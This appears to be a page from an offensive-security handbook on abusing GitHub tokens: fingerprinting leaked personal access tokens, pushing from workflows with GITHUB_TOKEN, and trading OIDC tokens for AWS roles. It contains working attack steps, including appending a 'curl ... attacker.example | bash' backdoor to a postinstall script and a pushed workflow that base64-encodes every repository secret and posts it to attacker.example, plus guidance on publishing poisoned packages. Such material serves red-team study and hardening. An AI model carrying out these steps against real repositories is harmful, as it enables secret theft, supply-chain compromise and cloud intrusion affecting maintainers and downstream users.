---
title: "Token and GITHUB_TOKEN abuse: turning CI tokens and leaked PATs into pushes and cloud roles"
order: 3
description: "Using the Actions GITHUB_TOKEN and its permission scoping, the workflow scope that lets you push malicious pipelines, leaked classic and fine-grained personal access tokens, reading granted scopes from response headers, and trading an OIDC token for a cloud role."
keywords:
  - GITHUB_TOKEN
  - personal access token
  - X-OAuth-Scopes
  - workflow scope
  - OIDC cloud role
---

# Token and GITHUB_TOKEN abuse

Every action against GitHub is mediated by a token, and the whole of the attack is learning **which token you hold, what it is scoped to, and where that scope reaches**. Three token families matter: the automatically injected `GITHUB_TOKEN` inside a workflow run, personal access tokens (PATs) found in the wild, and the short-lived OIDC token a workflow can exchange for cloud credentials.

## Reading what a token can do

Before using a token, fingerprint it. A classic PAT advertises its scopes in a response header; this is the single most useful call against any `ghp_`/`gho_` token you find:

```bash
curl -sI -H "Authorization: token $TOKEN" https://api.github.com/user \
  | grep -iE '^(x-oauth-scopes|x-accepted-oauth-scopes):'
# x-oauth-scopes: repo, workflow, admin:org, read:packages
```

`X-OAuth-Scopes` lists what the token actually carries. `repo` is full control of every repo the user can access; `workflow` additionally allows writing `.github/workflows/`; `admin:org` is org-wide control. A **fine-grained** PAT (`github_pat_`) returns an empty scope header because its permissions are per-repo and per-resource; probe it instead:

```bash
curl -s -H "Authorization: token $TOKEN" https://api.github.com/user   # whoami
gh api /user/repos --paginate -q '.[] | select(.permissions.push) | .full_name'
```

## GITHUB_TOKEN: default permissions and scoping

Inside a workflow, `GITHUB_TOKEN` is a short-lived installation token minted per run, auto-revoked when the job ends. Its power is set by the repo/org default and by any `permissions:` block. The historical default is read-write across the repo; the hardened default is read-only, with jobs opting back in:

```yaml
permissions:
  contents: write        # push commits, tags, releases
  packages: write        # publish to GitHub Packages / GHCR
  id-token: write        # mint an OIDC token for cloud federation
```

A run with `contents: write` lets you push to the repo straight from the job, which is the fastest supply-chain foothold once you have execution in a workflow (see [Actions workflow injection](actions-workflow-injection.md)):

```yaml
      - run: |
          git config user.email ci@acme.test && git config user.name ci
          echo 'curl -s https://attacker.example/i|bash' >> scripts/postinstall.sh
          git commit -am "chore: update" && git push
```

Note `GITHUB_TOKEN` cannot write to `.github/workflows/` even with `contents: write`: changing a workflow requires the `workflow` scope, which `GITHUB_TOKEN` never has. A leaked PAT carrying `workflow`, by contrast, can push a malicious pipeline that then runs with full secrets.

## Using a leaked PAT

Treat a recovered PAT as the user who owns it. Authenticate every call with it and act within its scopes:

```bash
# Push a backdoored workflow (needs the `workflow` scope)
git clone https://x-access-token:$TOKEN@github.com/ACME/service.git
cat > service/.github/workflows/ci2.yml <<'YML'
on: [push]
jobs: { x: { runs-on: ubuntu-latest, steps: [ { run: 'echo "${{ toJSON(secrets) }}" | base64 -w0 | curl -s -d @- https://attacker.example/s' } ] } }
YML
cd service && git add -A && git commit -m ci && git push    # the push triggers the run; secrets exfiltrate

# Mint a new PAT-like credential set for persistence where scopes allow
curl -s -H "Authorization: token $TOKEN" https://api.github.com/user/keys   # read deploy/SSH keys
```

Pushing a workflow that runs `on: [push]` executes it immediately with repo secrets, converting a `workflow`-scoped PAT into a full secret dump without waiting for a maintainer.

## OIDC token to a cloud role

A workflow with `id-token: write` can request a signed OIDC JWT from GitHub and present it to a cloud provider's federation endpoint. Where the cloud trust policy is loose (wildcards on repo, ref, or `audience`), you assume a role with no stored secret:

```yaml
      - run: |
          # Fetch the OIDC token GitHub offers to the job
          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          # Exchange it for AWS credentials against a role trusting this repo
          aws sts assume-role-with-web-identity --role-arn arn:aws:iam::111122223333:role/ci \
            --role-session-name x --web-identity-token "$TOKEN"
```

The returned keys are real cloud credentials. A trust policy that matches `repo:ACME/*` or any ref, rather than one exact repo and branch, means any workflow you can run in the org reaches that role.

## Follow-on

- `contents: write` or a `repo`/`workflow` PAT: push backdoors, tag poisoned releases, publish malicious packages that downstream consumers pull (supply chain).
- OIDC-assumed cloud role: pivot into the connected account, see [AWS identity](../../cloud/aws/identity/index.md) and its role-assumption paths.
- `admin:org` PAT: add members, change team permissions, install Apps, and plant durable access via [OAuth App and webhook abuse](oauth-app-and-webhook-abuse.md).
- Deploy keys and registry tokens dumped alongside: direct access to build infra and artifact registries.

## Exploitation notes

- Always read `X-OAuth-Scopes` first; it is the fastest classifier for classic PATs and saves blind probing.
- An empty scope header means a fine-grained PAT or a GitHub App token; enumerate accessible repos and their `permissions` instead.
- `GITHUB_TOKEN` is powerful but cannot touch `.github/workflows/` and dies with the job; a `workflow`-scoped PAT is the durable pipeline write primitive.
- Loose cloud OIDC trust (`sub` wildcards) is the common misconfiguration that turns any org workflow into cloud access; check the trust policy's `sub` and `aud` conditions.

## Tools

- **gh**: authenticate with a found token (`GH_TOKEN=... gh api`) to enumerate and act within its scope.
- **gato** (Praetorian): identifies repos where a `GITHUB_TOKEN` or PAT reaches secrets and self-hosted runners.
- **Configure AWS Credentials action** (`aws-actions/configure-aws-credentials`): reference implementation of the OIDC exchange, useful for understanding the trust conditions.

## References

- [GitHub: automatic token authentication and GITHUB_TOKEN permissions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)
- [GitHub: about OIDC hardening for cloud deployments](https://docs.github.com/en/actions/concepts/security/openid-connect)
- [GitHub: scopes for OAuth and personal access tokens](https://docs.github.com/en/apps/oauth-apps/building-oauth-apps/scopes-for-oauth-apps)
- [Rhino Security Labs: assessing GitHub tokens and scopes](https://rhinosecuritylabs.com/application-security/github-oauth-to-rce/)
- [Tinder Security Labs: identifying vulnerable GitHub Actions OIDC trust policies](https://medium.com/tinder/identifying-vulnerable-github-actions-workflows-c35dfb3f4e9e)
